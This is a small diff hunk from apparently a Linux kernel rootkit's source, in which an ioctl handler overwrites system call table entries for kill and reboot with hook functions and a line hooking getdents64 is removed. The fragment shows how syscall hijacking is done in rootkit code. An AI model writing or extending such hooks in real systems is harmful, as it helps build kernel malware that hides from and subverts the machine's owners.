@@ -230,7 +230,6 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl, unsigned long a
 
 		__sys_call_table[__NR_kill] = (unsigned long)&hook_kill;
 		__sys_call_table[__NR_reboot] = (unsigned long)&hook_reboot;
-		__sys_call_table[__NR_getdents64] = (unsigned long)&hook_getdents64;
 
 		protect_memory();
 
